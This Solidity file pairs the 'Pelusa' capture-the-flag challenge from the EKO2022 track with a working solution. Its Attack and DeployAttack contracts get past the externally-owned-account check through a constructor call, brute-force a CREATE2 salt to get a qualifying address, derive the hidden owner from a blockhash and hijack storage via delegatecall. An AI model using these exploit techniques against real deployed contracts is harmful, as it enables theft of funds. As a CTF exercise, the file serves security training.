// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGame {
    function getBallPossesion() external view returns (address);
}

// "el baile de la gambeta"
// https://www.youtube.com/watch?v=qzxn85zX2aE

/// @title Pelusa
/// @author https://twitter.com/eugenioclrc
/// @notice Its 1986, you are in the football world cup (Mexico86), help Diego score a goal.
/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/pelusa
contract Pelusa {
    address private immutable owner;

    address internal player;

    uint256 public goals = 1;

    constructor() {
        owner = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(msg.sender, blockhash(block.number))
                    )
                )
            )
        );
    }

    function passTheBall() external {
        require(msg.sender.code.length == 0, "Only EOA players");
        /// @dev "la pelota siempre al 10"
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

        player = msg.sender;
    }

    function isGoal() public view returns (bool) {
        // expect ball in owners posession
        return IGame(player).getBallPossesion() == owner;
    }

    function shoot() external {
        require(isGoal(), "missed");
        /// @dev use "the hand of god" trick
        (bool success, bytes memory data) = player.delegatecall(
            abi.encodeWithSignature("handOfGod()")
        );
        require(success, "missed");
        require(uint256(bytes32(data)) == 22_06_1986);
    }
}

// 0x8C59D246068A5A4ED0391d53e47AA900335AEE76 -- 1 st try owner
//    return address(uint160(uint256(keccak256(abi.encodePacked(addr, blockhash(8665983)))))); -- 0x8c506859473e0067Ee022b687641416C9c71F591
// 0x7e832a2fe739b959c376b9bcd8e8115330adbb9e -- from bytecode
// 0xd2cF9152b18B95654066eae4f1Bf8e3EB43F4674

//

// Pelusa 0xA8F932c6789926df660Ff5f08B1061187edC5C59

//  return address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, bytes32(uint256(0))))))); -- 0xd2cF9152b18B95654066eae4f1Bf8e3EB43F4674

// return address(uint160(uint256(keccak256(abi.encodePacked(addr, blockhash(8670175)))))); -- 0xCAa2A884fc55d4b3462785575383516deF7021D7

// watch 0xDEA44aA5B691A561DD2d242Cd096FdD01EAEBC0A
// BLOCKHASH 8670314 -- 0x8b8a6f1d3e4fab91313ac4a3e1bc6b507280a2a62ddc2f4898ec2b1fc390f37c
//                      0x0000000000000000000000000000000000000000000000000000000000000000
// our wallet -- 0x002B7f20fE09cC8e7E1C75654d09195532d344e1
// address(uint160(uint256(keccak256(abi.encodePacked(0x157EB6396D44F63D3970a72C253BfB5ACEEc80dD, blockhash1))))); -- 0xbde9293b40EeaBdf594a826d1eF77C066FB59Ba6
contract Watch {
    function check(
        address _addr,
        bytes32 _blockhash1
    ) external view returns (address data) {
        data = address(
            uint160(uint256(keccak256(abi.encodePacked(_addr, _blockhash1))))
        );
    }
}

contract bksh {
    function check() external view returns (bytes32 data) {
        return blockhash(8670314);
    }
}

contract Attack is IGame {
    address private owner = 0x7E832a2FE739b959c376B9bcd8e8115330AdBb9E;
    uint256 public goals;

    Pelusa private pelusa;

    constructor(address _target) {
        pelusa = Pelusa(_target);
        pelusa.passTheBall();
    }

    function attack() external {
        owner = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            0xAfF1f53D623289851D4a64d4DA2f64D226665F0F,
                            bytes32(
                                0x8b8a6f1d3e4fab91313ac4a3e1bc6b507280a2a62ddc2f4898ec2b1fc390f37c
                            )
                        )
                    )
                )
            )
        );
        pelusa.shoot();
    }

    function getBallPossesion() external view returns (address) {
        return owner;
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }
}

// require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");
contract DeployAttack {
    Attack public attacker;

    constructor(address target) {
        bytes32 salt = calculateSalt(target);
        attacker = new Attack{salt: bytes32(salt)}(target);
    }

    function calculateSalt(address target) private view returns (bytes32) {
        uint256 salt = 0;
        bytes32 initHash = keccak256(
            abi.encodePacked(type(Attack).creationCode, abi.encode(target))
        );

        while (true) {
            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(this),
                    bytes32(salt),
                    initHash
                )
            );

            if (uint160(uint256(hash)) % 100 == 10) {
                break;
            }

            salt += 1;
        }

        return bytes32(salt);
    }
}
//  (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
// require(success, "missed");
// require(uint256(bytes32(data)) == 22_06_1986);
